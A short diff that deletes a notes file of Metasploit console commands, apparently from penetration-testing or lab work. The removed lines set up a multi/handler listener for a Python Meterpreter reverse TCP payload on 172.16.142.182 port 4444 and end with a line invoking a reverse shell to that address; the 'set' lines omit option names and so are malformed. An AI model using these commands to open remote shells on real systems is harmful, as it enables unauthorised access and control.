@@ -1,7 +1,0 @@
-use multi/handler
-set payload python/meterpreter_reverse_tcp
-set 172.16.142.182
-set 4444
-exploit -j
-
-| revshell msf 172.16.142.182 4444
